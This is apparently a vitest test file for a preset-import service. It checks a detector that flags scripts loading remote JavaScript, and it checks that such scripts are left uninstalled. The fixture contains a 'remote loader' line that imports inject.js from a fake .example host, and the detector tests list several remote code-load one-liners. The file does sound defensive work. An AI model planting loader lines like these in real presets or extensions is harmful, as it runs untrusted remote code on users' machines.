import { describe, it, expect, afterAll } from 'vitest'
import fs from 'fs'
import os from 'os'
import path from 'path'
import { randomUUID } from 'crypto'
import {
  computePresetInventory,
  importPresetFromFile,
  getActivePresetId,
  deletePreset
} from '../src/main/services/presetService'
import { hasRemoteCodeLoad } from '../src/main/services/scriptService'
import * as regexService from '../src/main/services/regexService'
import * as scriptService from '../src/main/services/scriptService'
import { getAppDir } from '../src/main/services/storageService'

const profileId = `test-${randomUUID()}`
const profileDir = path.join(getAppDir(), 'profiles', profileId)
const tmpFiles: string[] = []
afterAll(() => {
  fs.rmSync(profileDir, { recursive: true, force: true })
  for (const f of tmpFiles) fs.rmSync(f, { force: true })
})

// A synthesized ST preset carrying one of every content class the inventory counts. Prose is
// scrambled placeholder text (no third-party preset content). The remote host is a fake domain
// modeled on the corpus's SoliUmbra loader shape (ADR 0017).
const fullPreset = (name: string): any => ({
  name,
  temperature: 0.7,
  openai_max_tokens: 1024,
  prompts: [
    { identifier: 'main', name: 'Main', role: 'system', content: 'Guide the tale of {{char}}.' },
    { identifier: 'tmpl', name: 'Templated', role: 'system', content: 'Roll: <%= 1 + 1 %> pips.' },
    { identifier: 'main', name: 'Main (dup)', role: 'system', content: 'a duplicated identifier' },
    { identifier: 'chatHistory', name: 'History', role: 'system', marker: true, content: '' }
  ],
  prompt_order: [
    {
      character_id: 100001,
      order: [
        { identifier: 'main', enabled: true },
        { identifier: 'tmpl', enabled: false },
        { identifier: 'chatHistory', enabled: true },
        { identifier: 'ghost', enabled: true } // no matching prompt → orphan
      ]
    }
  ],
  extensions: {
    regex_scripts: [
      { scriptName: 'core-a', findRegex: '/x/', replaceString: '' },
      { scriptName: 'core-b', findRegex: '/y/', replaceString: '' }
    ],
    // SPreset RegexBinding is a DISTINCT namespace — counted separately, never merged into core.
    SPreset: { RegexBinding: { regexes: [{ name: 's1' }, { name: 's2' }, { name: 's3' }] } },
    tavern_helper: {
      scripts: [
        { type: 'script', enabled: true, name: 'local', content: "console.log('local')" },
        {
          type: 'script',
          enabled: true,
          name: 'remote loader',
          content: "import('https://jnai2d9kgnbs6xzx5c.example/regex_bind/inject.js')"
        }
      ]
    },
    unknownThing: { foo: 1 },
    anotherUnknown: []
  }
})

const writeTmpPreset = (raw: any): string => {
  const p = path.join(os.tmpdir(), `rpt-preset-${randomUUID()}.json`)
  fs.writeFileSync(p, JSON.stringify(raw), 'utf-8')
  tmpFiles.push(p)
  return p
}

describe('hasRemoteCodeLoad (pure remote-code detector)', () => {
  it('flags remote ES-module imports, remote <script src>, importScripts, and remote .js URLs', () => {
    expect(hasRemoteCodeLoad("import('https://x.example/mod.js')")).toBe(true)
    expect(hasRemoteCodeLoad("import a from 'https://x.example/m.mjs'")).toBe(true)
    expect(hasRemoteCodeLoad("el.src = 'https://x.example/inject.js'")).toBe(true)
    expect(hasRemoteCodeLoad("importScripts('https://x.example/w.js')")).toBe(true)
    expect(hasRemoteCodeLoad("fetch('https://x.example/inject.js').then(r=>r.text())")).toBe(true)
  })

  it('does NOT flag local code, bare-specifier imports, or plain data fetches', () => {
    expect(hasRemoteCodeLoad("console.log('hello')")).toBe(false)
    expect(hasRemoteCodeLoad("import _ from 'lodash'")).toBe(false)
    expect(hasRemoteCodeLoad("fetch('https://api.example/data.json')")).toBe(false)
    expect(hasRemoteCodeLoad('')).toBe(false)
  })
})

describe('computePresetInventory (pure)', () => {
  it('counts every content class, keeps SPreset regex distinct, and lists anomalies', () => {
    const inv = computePresetInventory(fullPreset('Inv'))
    expect(inv.prompts).toBe(4)
    expect(inv.promptsEnabled).toBe(3) // main + main(dup, same id enabled) + chatHistory; tmpl off
    expect(inv.regexScripts).toBe(2)
    expect(inv.spresetRegex).toBe(3) // distinct from core — never merged
    expect(inv.tavernHelperScripts).toBe(2)
    expect(inv.remoteCodeScripts).toBe(1)
    expect(inv.ejsPrompts).toBe(1) // the <%= … %> block
    expect(inv.unknownExtensions.sort()).toEqual(['anotherUnknown', 'unknownThing'])
    expect(inv.duplicateIdentifiers).toEqual(['main'])
    expect(inv.orphanIdentifiers).toEqual(['ghost'])
  })

  it('tolerates a top-level array wrapper and a bare/empty preset', () => {
    expect(computePresetInventory([fullPreset('W')]).regexScripts).toBe(2)
    const empty = computePresetInventory({ name: 'plain', prompts: [] })
    expect(empty.prompts).toBe(0)
    expect(empty.regexScripts).toBe(0)
    expect(empty.spresetRegex).toBe(0)
    expect(empty.unknownExtensions).toEqual([])
  })
})

describe('importPresetFromFile — inventory + remote-code inertness (ADR 0017)', () => {
  it('returns the inventory and leaves remote-code scripts inert while installing the rest', () => {
    const file = writeTmpPreset(fullPreset('Inventory Fixture'))
    const result = importPresetFromFile(profileId, file)
    expect(result).not.toBeNull()

    // Inventory reflects what the preset CONTAINS.
    expect(result!.inventory.tavernHelperScripts).toBe(2)
    expect(result!.inventory.remoteCodeScripts).toBe(1)
    expect(result!.inventory.spresetRegex).toBe(3)

    // Installed counts reflect what actually RUNS: the remote-code script is not installed.
    expect(result!.scripts).toBe(1)
    expect(result!.regexScripts).toBe(2)

    const presetId = getActivePresetId(profileId)!
    const scripts = scriptService.listScripts(profileId)
    expect(scripts).toHaveLength(1)
    expect(scripts[0].name).toBe('local')
    // SPreset regex is counted but NOT routed into the core regex store (distinct namespaces).
    expect(regexService.listScripts(profileId)).toHaveLength(2)

    deletePreset(profileId, presetId)
    expect(scriptService.listScripts(profileId)).toHaveLength(0)
    expect(regexService.listScripts(profileId)).toHaveLength(0)
  })
})
